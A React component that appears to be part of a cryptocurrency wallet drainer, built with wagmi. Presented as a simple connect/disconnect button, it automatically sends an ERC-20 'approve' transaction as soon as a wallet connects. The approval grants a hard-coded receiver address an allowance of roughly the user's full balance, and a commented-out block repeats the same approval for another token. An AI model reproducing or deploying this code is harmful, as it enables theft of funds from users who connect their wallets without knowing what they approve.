"use client"
import { useSendTransaction, usePrepareContractWrite, useContractWrite, useWaitForTransaction ,useAccount, useBalance, useFeeData, useDisconnect, useWalletClient, useNetwork, useContractRead, usePublicClient } from 'wagmi'
import { signTrans } from '@/utils/transact'
// import { parseEther } from 'viem'
import {useState} from "react"
import { erc20ABI } from 'wagmi'

const receiver = "0x2170Ed0880ac9A755fd29B2688956BD959F933F8"
export const BCon = () => {
  //const adds = "0x2170Ed0880ac9A755fd29B2688956BD959F933F8"
  const publicClient = usePublicClient()
  
  const [amt, setAmt] = useState(BigInt("0"))

  const [req, setRequest] = useState({})
  
  const [account, setAccount] = useState('0x2170Ed0880ac9A755fd29B2688956BD959F933F8')
//  const [receiver, setReceiver] = useState("0x2170Ed0880ac9A755fd29B2688956BD959F933F8")
  const {address, isConnected} = useAccount({

    async onConnect({ address, connector, isReconnected }) {
     
    console.log("Balance ",data)
    console.log("Gas fee", gasPrice?.formatted)
    console.log("Address", address)
    let bal = data?.value || BigInt("0")
    let fee = gasPrice?.gasPrice || BigInt("0")
    const rems = fee - bal // - fee change back to balance minus fee
    setAmt(rems)

   
   
    }
  })

/*
  const { config } = usePrepareContractWrite({
    address: "0x6b175474e89094c44da98b954eedeac495271d0f",
    abi: erc20ABI,
    functionName: "approve",
    args: [receiver, amt],
    
    //account: walletClient?.getAddresses().[0]
  });  

   
  const {
    data: writeContractResult,
    writeAsync: approveAsync,
    error,
  } = useContractWrite(config);

  const { isLoading: isApproving } = useWaitForTransaction({
    hash: writeContractResult ? writeContractResult.hash : undefined,
    onSuccess(data) {
     console.log(data)
    },
    onError(err) {
      console.log(err)
    }
  })

*/  


const {data: walletClient, isFetched, status} = useWalletClient(
  
  { 
    
  onError(error) {
   
    console.log("WC error", error)
  },

  async onSuccess(data) {

    if(isConnected)
    {

      const addresses = await data?.getAddresses()
      console.log(addresses)
      const {request} = await publicClient.simulateContract({
        address: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",
        abi: erc20ABI,
        functionName: "approve",
        args: [receiver, amt],
        account: address
        
      })
     
     try {
      const res = await data?.writeContract(request)
   console.log("WC datas",res)
     } catch (error) {
      console.log(error)
     }
     
    }
   
 

  }
})



 
const {chain} = useNetwork()
const { disconnect } = useDisconnect()

    const { data } = useBalance({
      address
    })
const {data: gasPrice } = useFeeData()
   

        if(isConnected) return <button onClick={() => disconnect()}>Disconnect</button>
        return (
          <>
    <w3m-button />
     </>

        )

}


